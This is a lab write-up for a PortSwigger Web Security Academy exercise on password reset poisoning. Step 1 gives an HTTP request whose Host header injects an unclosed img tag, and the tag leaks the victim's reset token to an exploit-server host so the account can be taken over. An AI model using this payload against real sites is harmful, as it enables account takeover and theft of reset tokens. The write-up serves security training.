# Lab 06 — Password reset poisoning via dangling markup

> **Expert** · [Official lab](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-password-reset-poisoning-via-dangling-markup)

**Entry point:** the Host is validated — inject **dangling markup into the
reset email** through the Host header of an absolute-URL request, so the
email client leaks the token.

## Solution

1. Send the reset for carlos with an absolute-URL request line (bypasses
   Host validation, as in lab 05) and a Host value carrying the dangling
   payload:

```http
GET https://YOUR-LAB-ID.web-security-academy.net/forgot-password HTTP/1.1
Host: '"><img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?
...
username=carlos
```

The injected unclosed `<img src="https://exploit/?` swallows the rest of
the email — including the reset link and its token — as the image URL.

2. The exploit server access log receives the victim's reset email HTML up
   to the next quote — extract the `temp-forgot-password-token` value.
3. Complete the reset with the genuine link + carlos's token, set a new
   password, log in — lab solved.

## Notes

Antivirus/link-scanning in email clients is why plain redirects don't work
— dangling markup captures the token without a redirect. The lab hint
notes email clients don't run JavaScript, so use pure HTML capture.
